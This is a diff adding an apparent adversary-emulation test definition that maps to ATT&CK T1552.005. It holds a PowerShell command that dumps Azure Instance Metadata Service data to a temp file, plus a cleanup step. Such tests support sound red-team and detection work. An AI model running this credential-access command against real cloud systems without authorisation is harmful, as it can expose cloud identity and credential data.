@@ -1,0 +1,21 @@
+---
+- id: 315440f0fd42ea0129065a76d89184f1
+  name: Azure - Dump Azure Instance Metadata from Virtual Machines
+  description: "This test invokes a web request to the default Instance Metadata API\
+    \ of 169.254.169.254 in order to dump the data contained within it to a file.\
+    \ \nSee: https://www.sans.org/blog/cloud-instance-metadata-services-imds-/\n"
+  tactic: credential-access
+  technique:
+    attack_id: T1552.005
+    name: 'Unsecured Credentials: Cloud Instance Metadata API'
+  platforms:
+    unknown:
+      psh:
+        command: Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri
+          "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | ConvertTo-Json
+          -Depth 64 > $env:temp\T1552.005Test2.txt
+        payloads: []
+        cleanup: remove-item $env:temp\T1552.005Test2.txt -force -erroraction silentlycontinue
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
